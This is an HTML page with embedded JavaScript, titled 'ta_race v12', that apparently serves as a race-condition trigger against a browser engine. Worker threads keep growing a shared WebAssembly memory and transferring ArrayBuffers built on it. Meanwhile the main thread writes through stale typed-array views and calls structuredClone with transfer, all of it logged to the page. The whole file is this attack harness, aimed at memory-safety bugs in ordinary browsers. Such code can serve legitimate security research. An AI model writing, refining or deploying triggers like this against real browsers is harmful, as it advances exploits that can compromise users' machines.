<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ta_race v12</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:12px; margin:0; padding:8px; }
#log { white-space:pre-wrap; word-break:break-all; }
</style>
</head>
<body>
<div id="log">ta_race v12 loading...</div>
<script>
(function(){
"use strict";

var LOG = document.getElementById('log');
var t0 = Date.now();
var it = 0, gens = 0, clones = 0, heapMB = '?';

function log(msg) {
  var line = '[' + ((Date.now()-t0)/1000).toFixed(0) + 's it=' + it + ' gens=' + gens + ' clones=' + clones + ' heap=' + heapMB + 'MB] ' + msg;
  LOG.textContent += '\n' + line;
}

document.addEventListener('visibilitychange', function() {
  if(document.hidden) log('!!! PAGE HIDDEN — RUN DEAD !!!');
});

// shared WASM memory — the battleground
var SHARED_MEM = new WebAssembly.Memory({initial:1, maximum:128, shared:true});

// grow worker — with spawn confirm + error reporting
var growSrc = [
  'onmessage = function(e) {',
  '  var mem = e.data;',
  '  var n = 0;',
  '  postMessage({type:"spawn", msg:"grow worker alive"});',
  '  function grow() {',
  '    try { mem.grow(1); } catch(err) { postMessage({type:"growerr", msg:err.message}); return; }',
  '    n++;',
  '    if(n % 1000 === 0) postMessage({type:"grow", n:n});',
  '    setTimeout(grow, 0);',
  '  }',
  '  grow();',
  '};'
].join('\n');

// transfer worker — with spawn confirm
var transferSrc = [
  'onmessage = function(e) {',
  '  var mem = e.data;',
  '  var views = [];',
  '  for(var i=0; i<96; i++) views.push(new Uint8Array(mem.buffer, 0, 65536));',
  '  var n = 0;',
  '  postMessage({type:"spawn", msg:"transfer worker alive"});',
  '  function transfer() {',
  '    for(var i=0; i<96; i++) {',
  '      try {',
  '        var ab = views[i].buffer;',
  '        var t = ab.transfer();',
  '        views[i] = new Uint8Array(t, 0, Math.min(65536, t.byteLength));',
  '      } catch(err) {}',
  '    }',
  '    n++;',
  '    if(n % 1000 === 0) postMessage({type:"transfer", n:n});',
  '    setTimeout(transfer, 0);',
  '  }',
  '  transfer();',
  '};'
].join('\n');

var growBlob = new Blob([growSrc], {type:'application/javascript'});
var transferBlob = new Blob([transferSrc], {type:'application/javascript'});
var growURL = URL.createObjectURL(growBlob);
var transferURL = URL.createObjectURL(transferBlob);

var growWorker = new Worker(growURL);
var transferWorker = new Worker(transferURL);

var lastLog = 0;

growWorker.onmessage = function(e) {
  if(e.data.type === 'spawn') {
    log('SPAWN: ' + e.data.msg);
  }
  if(e.data.type === 'grow') {
    gens = e.data.n;
    if(Date.now() - lastLog > 3000) {
      lastLog = Date.now();
      if(performance.memory) heapMB = (performance.memory.usedJSHeapSize/1048576).toFixed(1);
      log('grow alive n=' + e.data.n);
    }
  }
  if(e.data.type === 'growerr') {
    log('GROW ERROR: ' + e.data.msg);
  }
};

transferWorker.onmessage = function(e) {
  if(e.data.type === 'spawn') {
    log('SPAWN: ' + e.data.msg);
  }
  if(e.data.type === 'transfer') {
    it = e.data.n;
    if(Date.now() - lastLog > 3000) {
      lastLog = Date.now();
      if(performance.memory) heapMB = (performance.memory.usedJSHeapSize/1048576).toFixed(1);
      log('transfer alive n=' + e.data.n);
    }
  }
};

// main thread: stale-view access + rare structuredClone
var mainViews = [];
for(var i=0; i<16; i++) mainViews.push(new Uint8Array(SHARED_MEM.buffer, 0, 65536));

function mainLoop() {
  for(var i=0; i<16; i++) {
    try { mainViews[i][0] ^= 0x41; } catch(err) {}
  }
  if(Math.random() < 1/4096) {
    try {
      var slice = new Uint8Array(SHARED_MEM.buffer, 0, 65536);
      structuredClone(slice, {transfer:[slice.buffer]});
      clones++;
    } catch(err) {}
  }
  setTimeout(mainLoop, 0);
}

growWorker.postMessage(SHARED_MEM);
transferWorker.postMessage(SHARED_MEM);

log('workers spawned, main entering loop');
mainLoop();

})();
</script>
</body>
</html>
